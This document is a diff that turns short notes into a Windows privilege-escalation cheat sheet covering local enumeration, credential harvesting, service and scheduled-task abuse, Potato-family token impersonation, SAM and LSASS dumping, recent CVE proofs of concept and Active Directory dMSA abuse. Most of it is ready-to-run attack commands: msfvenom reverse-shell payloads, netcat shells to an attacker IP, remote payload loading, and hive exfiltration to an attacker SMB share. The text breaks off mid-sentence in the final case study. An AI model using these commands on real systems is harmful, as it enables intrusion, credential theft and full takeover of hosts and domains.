@@ -1,208 +1,882 @@
-For advanced windows exploitation
-https://github.com/yeyintminthuhtut/Awesome-Advanced-Windows-Exploitation-References
+# Windows Privilege Escalation Cheat Sheet
 
-For post exploitation (Privilege Escalation)
-WinPrivEsc
+A field reference for moving from a low-privilege Windows account to `NT
+AUTHORITY\SYSTEM`, plus the Active Directory pivot path that often follows.
+Focuses on 2024-2026 techniques: BadSuccessor (Windows Server 2025 dMSA
+abuse), the modern Potato family, ADCS ESC15/ESC16, NTLM relay evolution,
+and the credential harvesting patterns that still work on patched hosts.
+Commands assume cmd unless prefixed with `PS>` for PowerShell.
 
-Credential Harvesting
-Unattended Windows Installation for Credentials
+Advanced Windows exploitation reading list:
+<https://github.com/yeyintminthuhtut/Awesome-Advanced-Windows-Exploitation-References>
+
+---
+
+## 1. Methodology in one paragraph
+
+After landing a shell, run the same loop: **Who am I and what privileges do I
+have?** (`whoami /priv`, `whoami /groups`), **What is the box?**
+(`systeminfo`, `wmic product`, `tasklist /svc`), and **What can I write to
+that SYSTEM will execute or read?** (service binaries, unquoted paths,
+scheduled tasks, DLL search order, registry auto-run). On a domain joined
+host, also enumerate the domain immediately: BloodHound CE, Kerberoasting,
+AS-REP roasting, ADCS templates (ESC1-ESC17), and the BadSuccessor dMSA
+path on Server 2025. Token impersonation (the Potato family) remains the
+single most reliable local privesc when you hold SeImpersonate.
+
+---
+
+## 2. Initial enumeration
+
+### System and user
+
+```
+whoami /all
+whoami /priv
+whoami /groups
+hostname
+systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
+wmic qfe list brief                       # installed patches, find missing KBs
+tasklist /svc
+net user
+net localgroup
+net localgroup Administrators
+net accounts                              # password policy
+```
+
+PowerShell equivalents and richer output:
+
+```
+PS> Get-LocalUser | Select Name,Enabled,LastLogon
+PS> Get-LocalGroupMember Administrators
+PS> Get-ComputerInfo | Select OsName,OsVersion,OsBuildNumber
+PS> Get-HotFix | Select HotFixID,InstalledOn
+PS> [System.Environment]::OSVersion.Version                # build number for CVE matching
+```
+
+### Network and services
+
+```
+ipconfig /all
+route print
+arp -a
+netstat -ano
+net start
+sc query state= all
+wmic service get Name,DisplayName,PathName,StartName | findstr /v "C:\Windows"
+tasklist /v
+```
+
+Find services with non-default paths (likely installed software, not patched
+by Windows Update):
+
+```
+wmic service get Name,PathName,StartName | findstr /v "C:\Windows"
+```
+
+### Installed software and versions
+
+```
+wmic product get name,version,vendor
+dir "C:\Program Files" "C:\Program Files (x86)"
+reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall /s | findstr /i "DisplayName DisplayVersion"
+```
+
+`wmic product` is slow and incomplete; cross-check desktop shortcuts,
+`Get-ItemProperty HKLM:\...\Uninstall\*` in PowerShell.
+
+### Automated enumeration
+
+```
+# WinPEAS - the PEASS family for Windows
+.\winPEASx64.exe
+.\winPEASx86.exe
+
+# PrivescCheck - itm4n, integrates LOLDrivers for BYOVD detection
+powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Report PrivescCheck_$env:COMPUTERNAME -Format TXT,HTML,CSV,XML"
+# PSv2/CLM bypass:
+Get-Content .\PrivescCheck.ps1 | Out-String | Invoke-Expression
+# Download: https://github.com/itm4n/PrivescCheck/releases/latest/download/PrivescCheck.ps1
+
+# PowerUp - classic PowerSploit privesc checks
+Import-Module .\PowerUp.ps1
+Invoke-AllChecks
+Invoke-PrivescAudit
+
+# Seatbelt - GhostPack, lots of system info
+.\Seatbelt.exe -group=all
+.\Seatbelt.exe -group=Misc -outputFile=seatbelt.txt
+
+# SharpUp - subset of PowerUp in C#
+.\SharpUp.exe
+
+# Watson / Sherlock - missing KB / CVE matching
+.\Watson.exe
+.\Sherlock.ps1
+
+# BloodHound CE / SharpHound for AD
+Import-Module .\SharpHound.ps1
+Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Temp
+# Remote, no shell (BloodHound.py CE branch):
+bloodhound-ce-python -u user -p 'pass' -d domain.local -dc-ip 10.10.10.10 -c all
+```
+
+---
+
+## 3. Credential harvesting (always do this first)
+
+### Unattended install files
+
 ```
 C:\Unattended.xml
 C:\Windows\Panther\Unattended.xml
 C:\Windows\Panther\Unattended\Unattended.xml
 C:\Windows\system32\sysprep.inf
 C:\Windows\system32\sysprep\sysprep.xml
+type C:\Windows\Panther\Unattended.xml | findstr /i password
 ```
-Powershell History
+
+### PowerShell history
+
 ```
-cmd.exe
-%userprofile%\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt
+cmd /c type "%userprofile%\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt"
+PS> (Get-PSReadlineOption).HistorySavePath
 ```
-Saved Windows Credentials
+
+### Saved Windows credentials
+
 ```
 cmdkey /list
 runas /savecred /user:admin cmd.exe
 ```
-IIS Config
+
+### IIS and web config
+
 ```
 C:\inetpub\wwwroot\web.config
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
-<command> | findstr connectionString
-```
-Retrieve Credentials from PuTTY
-```
-reg query
-HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ 
-/f “Proxy” /s 
-look for softwares that stores passwords, including browsers, email clients, FTP clients, VNC software etc.
+C:\Windows\Microsoft.NET\Framework\v4.0.30319\Config\web.config
+type C:\inetpub\wwwroot\web.config | findstr connectionString
 ```
 
-Scheduled tasks
+### PuTTY and other saved sessions
+
 ```
-schtasks /query /tn <taskname> /fo <format-type> /v
-check for task permissions
-icacls <path\to\task>
-check for (F) full permissions on the BUILTIN\Users level
-echo C:\Path\to\netcat -e cmd.exe <attacker-ip> <port> > <path\to\task>
+reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
+# Also check: WinSCP, FileZilla, RDP saved sessions, mRemoteNG, VNC, browsers
+```
 
-set up listener on attacking machine
-nc -nvlp <port>
-schtasks /run /tn <taskname>
+### Vault, Credential Manager, autologon
 
-#always install elevated
-//using msi windows installer files for priv esc
-//check registry for:
-reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
-reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
-//if both are set, then craft a payload
-msfvenom -p windows /x64/shell_reverse_tcp LHOST=<attacking-ip> LPORT=<local-port> -f msi -o malicious.msi
-//run the installer using:
+```
+cmdkey /list
+PS> Get-StoredCredential
+PS> Get-CachedCredential
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
+```
+
+### DPAPI and browser cookies
+
+```
+# SharpChrome / SharpWeb / SharpDPAPI from GhostPack
+.\SharpChrome.exe logins
+.\SharpDPAPI.exe masterkeys
+.\SharpDPAPI.exe credentials
+```
+
+### WiFi keys
+
+```
+netsh wlan show profile
+netsh wlan show profile name="<SSID>" key=clear
+```
+
+### AlwaysInstallElevated
+
+```
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+# If both = 1, MSI runs as SYSTEM
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f msi -o malicious.msi
 msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
 ```
-Abusing Service Misconfiguration
-```
-Service Control Manager (SCM)
-Each service on a Windows machine will have an associated executable which will be run by the SCM whenever a service is started. It is important to note that service executables implement special functions to be able to communicate with the SCM, and therefore not any executable can be started as a service successfully. Each service also specifies the user account under which the service will run.
-command: sc <server-name> qc [service-name] <buffer-size>
-BINARY_PATH_NAME: path of executable
-SERVICE_START_NAME: account used to run the service
-Discretionary Access Control List (DACL): indicates who has permission to start, stop, pause, query status, query configuration, or reconfigure the service, amongst other privileges.
-//use process hacker
-//all service configs are stored at: HKLM\SYSTEM\CurrentControlSet\Services\
-ImagePath: path of executable
-ObjectName: account used to run the service
-Security: subkey for DACL config of a service
 
-Insecure Permissions on Service Executables
+---
+
+## 4. Service abuse
+
+Service Control Manager (SCM) launches each service's executable. Each
+service also has a Discretionary Access Control List (DACL) saying who can
+reconfigure it. All service configs live under
+`HKLM\SYSTEM\CurrentControlSet\Services\` with values `ImagePath` (binary
+path), `ObjectName` (run-as account), and `Security` (DACL). Use Process
+Hacker or `sc` for the GUI/CLI view.
+
+```
+sc qc <service-name>                      # query config
+accesschk64.exe -accepteula -qlc <service-name>     # check DACL
+icacls "<binary-path>"                    # check file ACL
+wmic service get Name,PathName,StartName
+```
+
+### Insecure permissions on the service executable
+
+If `icacls` shows `Everyone:(M)` or `BUILTIN\Users:(F)` on the binary path:
+
+```
 sc qc <service-name>
-icacls <executable-path>
-//if you see modifying permissions for everyone then create a reverse shell with format exe-service and host a server on your <attacking-ip> and wget the rev shell: wget http://<attacking-ip>:<port>/reverse_shell.exe
-cd <executable-directory>
-replace the real executable service with the reverse shell downloaded:
-move original-service.exe original-service.exe.bkp
-move C:\Users\<username>\reverse_shell.exe original-service.exe
-//switch from powershell to cmd 
-sc stop <service-name>            //sc is an alias for Set-Content
-sc start <service-name>
-#catch the reverse shell using netcat or socat or whatever you like bleh :p
-``````
-Unquoted Service Paths
-``````
-//an obscure feature for forcing a service into running arbitrary executables when we directly can’t write into service executables
-/*While this sounds trivial, most of the service executables will be installed under C:\Program Files or C:\Program Files (x86) by default, which isn't writable by unprivileged users. This prevents any vulnerable service from being exploited. There are exceptions to this rule: - Some installers change the permissions on the installed folders, making the services vulnerable. - An administrator might decide to install the service binaries in a non-default path. If such a path is world-writable, the vulnerability can be exploited. */
-//check for BUILT_IN\Users for AD and WD permissions (allows you to create sub directories and files under the queried folder)
-//there will be different commands and arguments to be executed if the path file is unquoted, create and place a reverse shell in place of any of the writable directory
-sc stop “service name”
-sc start “service name”
-catch the reverse shell
-``````
-Insecure Service Permissions
-``````
-Should the service DACL (not the service's executable DACL) allow you to modify the configuration of a service, you will be able to reconfigure the service. This will allow you to point to any executable you need and run it with any account you prefer, including SYSTEM itself.
-//use accesschk from SysInternals suite
-accesschk64.exe -qlc <service-name>       #check DACL for service
-check for SERVICE_ALL_ACCESS in BUILTIN\Users (any user can reconfigure service)
-//create a server and transfer a exe-service format reverse shell and place it in the desirable folder
-icacls <path-to-reverse-shell> /grant Everyone:F         #granting everyone the permission to execute the payload
-sc config <service-name> binPath= “<path-to-reverse-shell>” obj=LocalSystem
+icacls "C:\Program Files\app\service.exe"
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f exe-service -o svc.exe
+certutil -urlcache -f http://<ip>/svc.exe C:\Users\Public\svc.exe
+move "C:\Program Files\app\service.exe" "C:\Program Files\app\service.exe.bkp"
+move C:\Users\Public\svc.exe "C:\Program Files\app\service.exe"
+# Switch to cmd if in PowerShell (sc is Set-Content alias in PS)
 sc stop <service-name>
 sc start <service-name>
-//catch the reverse shell with higher privilege
-``````
+```
 
-Abusing Dangerous Privileges
+### Unquoted service paths
+
+When `ImagePath` is unquoted and contains spaces, Windows tries each prefix:
+`C:\Program.exe`, `C:\Program Files\app.exe`, etc. Exploitable only if one
+of those prefixes is in a world-writable directory.
+
+```
+wmic service get Name,PathName | findstr /i "Program Files"
+# For each unquoted path, walk the dir ACLs:
+icacls "C:\Program Files\app"
+icacls "C:\Program Files"
+# Look for BUILTIN\Users with (AD) append or (WD) write
+# Drop a reverse shell named after the first prefix, then start the service
+```
+
+### Insecure service DACL (reconfigure the service)
+
+If `accesschk` shows `SERVICE_ALL_ACCESS` or `SERVICE_CHANGE_CONFIG` for
+`BUILTIN\Users`:
+
+```
+accesschk64.exe -accepteula -uwcqv *
+sc config <service-name> binPath= "C:\Users\Public\svc.exe" obj= LocalSystem
+sc stop <service-name>
+sc start <service-name>
+```
+
+PowerUp wrappers:
+
+```
+PS> Invoke-ServiceAbuse -Name <svc> -Command "net localgroup Administrators pwn /add"
+PS> Restore-ServiceBinary -Name <svc>
+PS> Write-ServiceBinary -Name <svc> -Command "..."
+```
+
+---
+
+## 5. DLL hijacking and search order
+
+Windows searches for DLLs in this order: directory of the calling process,
+then `System32`, then `Windows`, then current dir, then `PATH`. A writable
+directory early in the chain plus a missing DLL = your DLL loads as the
+service.
+
+```
+# Find services with writable binary directories
+for /f "tokens=2 delims=:=" %s in ('sc qc ^| findstr BINARY_PATH') do icacls "%s"
+# Or use Process Monitor with filter Path ends with .dll, Result NAME NOT FOUND
+# Common targets: Program Files app folders, PATH entries writable by Users
+```
+
+Tools: Process Monitor (procmon), `Find-DllHijack` in PowerUp, `PrivescCheck`.
+
+---
+
+## 6. Scheduled tasks
+
+```
+schtasks /query /fo LIST /v | findstr /i "TaskName Run As User"
+schtasks /query /tn <task> /fo LIST /v
+icacls "<path\to\task\script>"
+# If writable:
+echo C:\Users\Public\nc.exe -e cmd.exe <attacker-ip> <port> > "<path\to\task>"
+schtasks /run /tn <task>
+```
+
+Find tasks running as SYSTEM with a writable action:
+
+```
+schtasks /query /fo LIST /v | findstr /i "Run As User:\sSYSTEM"
+# Cross-reference task action paths against icacls output
+```
+
+---
+
+## 7. Token privileges and the Potato family
+
 ```
 whoami /priv
-https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants
-https://github.com/gtworek/Priv2Admin
+# Look for: SeImpersonate, SeAssignPrimaryToken, SeDebug, SeBackup, SeRestore,
+# SeTakeOwnership, SeLoadDriver, SeTcb, SeManageVolume, SeCreateToken
 ```
-SeBackup /SeRestore	
-``````
-/* allow users to read and write to any file in the system, ignoring any DACL in place. The idea behind this privilege is to allow certain users to perform backups from a system without requiring full administrative privileges */
-//for now, copying SAM and SYSTEM registry hives to obtain the local administrator’s password’s hash
-//check for SeChangeNotifyPrivilege: Enabled (for bypassing traverse checking)
-On Windows Machine
-reg save hklm\system C:\Users\<username>\system.hive
-reg save hklm\sam C:\Users\<username>\sam.hive
-On Kali
-mkdir share
-python3 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share
-On Windows machine
-copy C:\Users\<username>\sam.hive \\<attacker-ip>\public\
-copy C:\Users\<username>\system.hive \\<attacker-ip>\public\ 
-On Kali
+
+Privilege reference: <https://github.com/gtworek/Priv2Admin>
+<https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants>
+
+### SeImpersonate / SeAssignPrimaryToken
+
+The most reliable local privesc on modern Windows. Hold it from IIS AppPool,
+MSSQL, LOCAL SERVICE, NETWORK SERVICE, scheduled task service accounts, etc.
+
+`whoami /priv | findstr /i impersonate`
+
+JuicyPotato is legacy on Windows 10 1809+/Server 2019+. Use the successors.
+The Potato Garden (https://github.com/0xSebin/The-Potato-Garden) curates 18
+variants:
+
+| Tool | When to use |
+|------|-------------|
+| PrintSpoofer | Print Spooler running (disabled post-PrintNightmare on hardened hosts) |
+| RoguePotato | OXID resolver reachable on TCP/135, use a redirector if egress blocked |
+| SharpEfsPotato / EfsPotato | EFSRPC pipes (lsarpc, efsrpc, samr, lsass, netlogon) |
+| GodPotato | Windows 8/8.1-11, Server 2012-2022, .NET runtime present |
+| SigmaPotato | GodPotato fork, in-memory reflection, .NET 2.0 core build |
+| PrintNotifyPotato | PrintNotify COM service, works when Spooler is disabled |
+| DCOMPotato | DCOM service objects, PrinterNotify or McpManagement variants |
+| DeadPotato | GodPotato + post-ex modules (Mimikatz, SharpHound, Defender off), noisy |
+| LocalPotato | NTLM local authentication reflection (CVE-2023-21746) |
+| MultiPotato | Accepts multiple trigger methods |
+| PetitPotato | PetitPotam-style local coercion |
+| AppxPotato | Appx deployment service abuse |
+| RasManPotato | RasMan service abuse |
+| CandyPotato | Updated RottenPotato variant |
+| BravePotato | Brave browser service abuse |
+| ADCSCoercePotato | ADCS web enrollment coercion |
+| RogueWinRM | WinRM disabled, BITS service triggers auth to port 5985 |
+
+Quick commands:
+
+```
+:: PrintSpoofer
+PrintSpoofer.exe -c "c:\tools\nc.exe <ip> <port> -e cmd"
+PrintSpoofer.exe -i -c "cmd"        :: interactive
+
+:: RoguePotato (needs redirector on TCP/135 if egress blocked)
+:: On attacker redirector:
+socat tcp-listen:135,reuseaddr,fork tcp:VICTIM:9999
+:: On victim:
+RoguePotato.exe -r <redirector-ip> -c "nc.exe <ip> <port> -e cmd" -l 9999
+
+:: GodPotato
+GodPotato -cmd "cmd /c whoami"
+GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe <ip> <port>"
+
+:: SigmaPotato (reflection, no disk touch)
+PS> [System.Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData("http://<ip>/SigmaPotato.exe"))
+PS> [SigmaPotato]::Main("cmd /c whoami")
+PS> [SigmaPotato]::Main(@("--revshell","<ip>","4444"))
+
+:: PrintNotifyPotato
+PrintNotifyPotato.exe cmd /c "powershell -ep bypass -File C:\ProgramData\stage.ps1"
+PrintNotifyPotato.exe whoami
+
+:: EfsPotato (try alternative pipes if one is blocked)
+EfsPotato.exe "whoami"
+EfsPotato.exe "whoami" lsarpc
+EfsPotato.exe "whoami" efsrpc
+
+:: NTLM-Relay-to-SYSTEM (PrivEscalator) - COM server hijacking
+PrivEscalator.exe -m Auto -p "C:\Windows\System32\cmd.exe"
+PrivEscalator.exe -p ncat.exe -a "-lvnp 443 -e cmd.exe"
+```
+
+If `whoami /priv` shows a filtered token without SeImpersonate (common for
+LOCAL SERVICE/NETWORK SERVICE), restore default privileges first:
+
+```
+FullPowers.exe -c "cmd /c whoami /priv" -z
+```
+
+### SeBackupPrivilege / SeRestorePrivilege
+
+Read any file regardless of ACL (Backup) or write any file (Restore).
+
+```
+:: Classic SAM/SYSTEM dump via reg save
+reg save hklm\system C:\Users\Public\system.hive
+reg save hklm\sam    C:\Users\Public\sam.hive
+reg save hklm\security C:\Users\Public\security.hive
+:: Exfiltrate via SMB share on attacker:
+python3 /opt/impacket/examples/smbserver.py -smb2support -u user -p pass public share
+copy C:\Users\Public\sam.hive    \\<ip>\public\
+copy C:\Users\Public\system.hive \\<ip>\public\
+:: Crack hashes:
 python3 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
-//perform pass the hash
-python3 /opt/impacket/examples/psexec.py -hashes <hash> administrator@<ip-address>
-``````
-SeTakeOwnership
-``````
-//run cmd as admin
-whoami /priv
-//check for SeTakeOwnership
-//abusing utilman.exe which runs with SYSTEM privileges
+:: Pass the hash:
+python3 /opt/impacket/examples/psexec.py -hashes <hash> administrator@<ip>
+```
+
+VSS + robocopy backup mode is more reliable for locked files:
+
+```
+:: shadow.txt
+set context persistent nowriters
+add volume c: alias tk
+create
+expose %tk% z:
+
+diskshadow /s shadow.txt
+robocopy /b z:\Windows\System32\config C:\Temp SAM SYSTEM SECURITY
+robocopy /b z:\Windows\NTDS C:\Temp ntds.dit        :: on a DC
+```
+
+### SeTakeOwnershipPrivilege
+
+Take ownership of any object, then grant yourself full control.
+
+```
 takeown /f C:\Windows\System32\Utilman.exe
-icacls C:\Windows\System32\Utilman.exe /grant <username>:F
-copy cmd.exe utilman.exe
-//lock the windows session and use ease of access for getting nt/authority level cmd shell
-``````
-SeImpersonate/ SeAssignPrimaryToken
-``````
-These privileges allow a process to impersonate other users and act on their behalf. Impersonation usually consists of being able to spawn a process or thread under the security context of another user.
-Impersonation is easily understood when you think about how an FTP server works. The FTP server must restrict users to only access the files they should be allowed to see.
-As attackers, if we manage to take control of a process with SeImpersonate or SeAssignPrimaryToken privileges, we can impersonate any user connecting and authenticating to that process.
-In Windows systems, you will find that the LOCAL SERVICE and NETWORK SERVICE ACCOUNTS already have such privileges. Since these accounts are used to spawn services using restricted accounts, it makes sense to allow them to impersonate connecting users if the service needs. Internet Information Services (IIS) will also create a similar default account called "iis apppool\defaultapppool" for web applications.
-To elevate privileges using such accounts, an attacker needs the following: 1. To spawn a process so that users can connect and authenticate to it for impersonation to occur. 2. Find a way to force privileged users to connect and authenticate to the spawned malicious process.
-The RogueWinRM exploit is possible because whenever a user (including unprivileged users) starts the BITS service in Windows, it automatically creates a connection to port 5985 using SYSTEM privileges. Port 5985 is typically used for the WinRM service, which is simply a port that exposes a Powershell console to be used remotely through the network. Think of it like SSH, but using Powershell.
-If, for some reason, the WinRM service isn't running on the victim server, an attacker can start a fake WinRM service on port 5985 and catch the authentication attempt made by the BITS service when starting. If the attacker has SeImpersonate privileges, he can execute any command on behalf of the connecting user, which is SYSTEM.
-//on kali
-nc -nvlp <port>
-//command for windows exploit
-<path-for-RogueWinRM>\RogueWinRM.exe -p “<path-to-netcat>\nc64.exe” -a “-e cmd.exe <attacker-ip> <port>”
-//catch the reverse shell with nt/authority privileges
-``````
-Unpatched Software
-``````
-Software installed on the target system can present various privilege escalation opportunities. As with drivers, organisations and users may not update them as often as they update the operating system. You can use the wmic tool to list software installed on the target system and its versions. The command below will dump information it can gather on installed software (it might take around a minute to finish):
+icacls C:\Windows\System32\Utilman.exe /grant <user>:F
+copy /y C:\Windows\System32\cmd.exe C:\Windows\System32\Utilman.exe
+:: Lock the session, press Win+U (Ease of Access) to get SYSTEM cmd
+```
+
+Useful files to take over for credentials:
+
+```
+%WINDIR%\repair\sam
+%WINDIR%\repair\system
+%WINDIR%\repair\software
+%WINDIR%\repair\security
+%WINDIR%\system32\config\*.sav
+c:\inetpub\wwwroot\web.config
+```
+
+### SeDebugPrivilege
+
+Open and duplicate tokens of SYSTEM processes, or dump memory.
+
+```
+:: Dump LSASS (blocked if RunAsPPL / LSA Protection enabled)
+procdump -accepteula -ma lsass.exe lsass.dmp
+mimikatz # sekurlsa::minidump lsass.dmp
+mimikatz # sekurlsa::logonpasswords
+
+:: Copy token from a non-PPL SYSTEM process
+PS> Import-Module .\psgetsys.ps1
+PS> [MyProcess]::CreateProcessFromParent(<system_pid>, "cmd.exe")
+```
+
+If LSASS is PPL-protected, steal a token from another non-PPL SYSTEM process
+(winlogon, services) or use a PPL bypass/BYOVD chain.
+
+### SeLoadDriverPrivilege (BYOVD)
+
+Load a signed but vulnerable kernel driver, then use its IOCTLs for kernel
+R/W or to disable security tooling. PrivescCheck integrates LOLDrivers
+(<https://www.loldrivers.io/api/drivers.csv>) for detection.
+
+```
+fltMC sysmondrv                      :: unload Sysmon driver
+:: BYOVD: load a signed driver with known vuln, escalate to kernel
+:: Note: Microsoft vulnerable driver blocklist and HVCI break older chains
+::       like szkg64.sys on modern Windows 11/Server builds.
+:: Blocklist updated quarterly: https://aka.ms/VulnerableDriverBlockList
+:: HVCI/Memory Integrity is the strongest mitigation.
+```
+
+Registry path under HKCU: `\Registry\User\<RID>\System\CurrentControlSet\Services\<Driver>`
+with `ImagePath` and `Type=1` (SERVICE_KERNEL_DRIVER).
+
+### SeManageVolumePrivilege
+
+Raw volume handle I/O bypasses NTFS ACLs. Read any file by block, including
+CA private keys for Golden Certificate attacks.
+
+### Enable all disabled privileges
+
+```
+PS> .\EnableAllTokenPrivs.ps1
+PS> whoami /priv
+```
+
+---
+
+## 8. 2025-2026 Windows CVEs
+
+### CVE-2025-26633 - MSC EvilTwin LPE (CVSS 7.8)
+
+Affects Windows 10/11 and Server 2016-2025, patched March 2025. Malformed
+`.msc` (MMC snap-in) file triggers arbitrary code execution when opened in
+`mmc.exe`. Actively exploited by Water Gamayun APT as a zero-day before
+patching. PoC creates a local admin.
+
+```
+git clone https://github.com/mbanyamer/MSC-EvilTwin-Local-Privilege-Escalation
+python3 CVE-2025-26633_mmc_addadmin.py
+# Creates user "hacker" / "P@ssw0rd123!"
+```
+
+Detection: monitor `mmc.exe` spawning child processes, `.msc` execution
+from user-writable locations, Event ID 4688.
+
+### CVE-2025-54918 - Windows NTLM EoP (CVSS 8.8)
+
+Network-based NTLM authentication bypass. Race condition in NTLM Session
+Key Derivation allows a malformed SPN in the NTLM negotiate packet to reuse
+a stale session key, authenticating as SYSTEM. Patched September 2025.
+
+```
+# Recon + harvest + relay chain
+responder -i eth0 -f
+python3 impacket/secretsdump.py <victim-ip> <user>
+python3 impacket/ntlmrelay.py <victim-ip> <target-ip>
+# Metasploit auxiliary/windows/ntlm_bypass
+```
+
+Mitigation: `LmCompatibilityLevel=3`, install KB on all DCs, disable NTLM
+where possible. Part of the 2025 NTLM bug surge (also CVE-2025-53778,
+CVE-2025-21311). Often chained with CVE-2025-55226 (win32k.sys graphics
+race RCE, patched Sept 16 2025).
+
+### CVE-2025-55234 - Windows SMB Privilege Escalation
+
+SMB stack privilege escalation, companion to CVE-2025-54918. 2025 saw a
+surge in SMB vulnerabilities. Detection focuses on SMB session key overwrite
+and NTLM negotiate anomalies.
+
+### CVE-2025-62215 - Windows Kernel Double-Free LPE
+
+Race condition in the Windows kernel leading to a double-free, allowing LPE
+to SYSTEM. Requires Administrator rights per the PoC (limits real-world
+privesc value, more useful as sandbox escape). Uses multithreaded handle
+manipulation and heap spraying.
+
+```
+git clone https://github.com/abrewer251/CVE-2025-62215_Windows_Kernel_PE
+cl.exe poc.cpp /Od /ZI /RTC1 /MDd /link /OUT:unicorn.exe
+```
+
+### CVE-2025-53779 - BadSuccessor (Windows Server 2025 dMSA abuse)
+
+The flagship 2025 AD privesc. Affects Windows Server 2025 domain
+controllers (dMSA feature introduced here). Works in default config; the
+domain need not use dMSAs, the mere existence of the feature is
+exploitable. Discovered by Akamai (Yuval Gordon), disclosed at DEF CON
+2025. Vulnerable builds < 10.0.26100.4851.
+
+Root cause: KDC builds the PAC based solely on the
+`msDS-ManagedAccountPrecededByLink` attribute with no verification of
+legitimate migration. An attacker with CreateChild rights on any OU can
+create a dMSA, link it to a target (e.g. Domain Admin), and request a TGT
+that carries the target's RIDs in the PAC.
+
+Prerequisites: any domain user with CreateChild (or
+`Create msDS-DelegatedManagedServiceAccount`) rights on any OU. Found in
+91% of examined environments. No permissions on the target account needed.
+
+```
+# 1. Find OU with CreateChild rights
+Get-DomainObjectAcl -Identity "OU=Staff,DC=domain,DC=com" | ?{$_.ActiveDirectoryRights -match "CreateChild"}
+
+# 2. Create dMSA and link to target
+New-ADServiceAccount -Path "OU=Staff,DC=domain,DC=com" -Name attacker_dmsa
+# Grant self GenericAll, set msDS-ManagedAccountPrecededByLink = target DN
+# Set msDS-DelegatedMSAState = 2
+
+# 3. Request TGT via Rubeus (dMSA support added Nov 2024, PR #194)
+Rubeus.exe asktgs /targetuser:attacker_dmsa$ /service:krbtgt/DOMAIN /dmsa /opsec /nowrap /ptt /ticket:<Machine TGT>
+
+# Full automation:
+git clone https://github.com/R8Sec/BadSuccessor
+.\BadSuccessor.ps1 -TargetOU "OU=Staff,DC=domain,DC=com"
+
+# Defender scan:
+git clone https://github.com/akamai/BadSuccessor
+.\Get-BadSuccessorOUPermissions.ps1
+```
+
+Bonus: the `KERB-DMSA-KEY-PACKAGE` `previous-keys` field contains the
+superseded account's RC4-HMAC key, enabling offline credential compromise
+of any user/computer.
+
+Post-patch (Aug 27 2025): direct escalation closed, KDC now requires mutual
+pairing. But the attribute remains writable, so BadSuccessor persists as a
+shadow credentials alternative and DCSync alternative in owned domains.
+
+Detection: Event 5137 (dMSA creation), Event 5136 (modifications to
+`msDS-ManagedAccountPrecededByLink` / `msDS-DelegatedMSAState`), Event 2946
+(dMSA TGT with `KERB-DMSA-KEY-PACKAGE`).
+
+Mitigation: patch DCs, restrict CreateChild for dMSA object type (GUID
+`0feb936f-47b3-49f2-9386-1dedc2c23765`), dedicated `dMSA-Admins` group,
+quarterly OU ACL review.
+
+---
+
+
+## 9. Unquoted path / autorun / DLL hijack automated
+
+```
+# PowerUp
+Invoke-AllChecks
+# Look for: UnquotedPath, ModifiableServiceBinary, ModifiableServicePath,
+#           RegistryAutoLogon, AlwaysInstallElevated, ModifiableScheduledTask
+```
+
+---
+
+## 10. Unpatched software
+
+```
 wmic product get name,version,vendor
-Remember that the wmic product command may not return all installed programs. Depending on how some of the programs were installed, they might not get listed here. It is always worth checking desktop shortcuts, available services or generally any trace that indicates the existence of additional software that might be vulnerable.
-Once we have gathered product version information, we can always search for existing exploits on the installed software online on sites like exploit-db, packet storm or plain old Google, amongst many others.
-``````
-Case Study: Druva inSync 6.6.3
-``````
-The target server is running Druva inSync 6.6.3, which is vulnerable to privilege escalation as reported by Matteo Malvica. The vulnerability results from a bad patch applied over another vulnerability reported initially for version 6.5.0 by Chris Lyne.
-The software is vulnerable because it runs an RPC (Remote Procedure Call) server on port 6064 with SYSTEM privileges, accessible from localhost only. If you aren't familiar with RPC, it is simply a mechanism that allows a given process to expose functions (called procedures in RPC lingo) over the network so that other machines can call them remotely.
-In the case of Druva inSync, one of the procedures exposed (specifically procedure number 5) on port 6064 allowed anyone to request the execution of any command. Since the RPC server runs as SYSTEM, any command gets executed with SYSTEM privileges.
-The original vulnerability reported on versions 6.5.0 and prior allowed any command to be run without restrictions. The original idea behind providing such functionality was to remotely execute some specific binaries provided with inSync, rather than any command. Still, no check was made to make sure of that.
-A patch was issued, where they decided to check that the executed command started with the string C:\ProgramData\Druva\inSync4\, where the allowed binaries were supposed to be. But then, this proved insufficient since you could simply make a path traversal attack to bypass this kind of control. Suppose that you want to execute C:\Windows\System32\cmd.exe, which is not in the allowed path; you could simply ask the server to run C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe and that would bypass the check successfully.
-//exploit to be executed in powershell
+# wmic product misses a lot; check Program Files, shortcuts, services
+# Search exploit-db / packet storm / Google for each "name version"
+```
+
+### Case study: Druva inSync 6.6.3 (RPC path traversal to SYSTEM)
+
+Druva runs an RPC server on port 6064 as SYSTEM, localhost only. Procedure
+5 runs any command. A patch checked the command started with
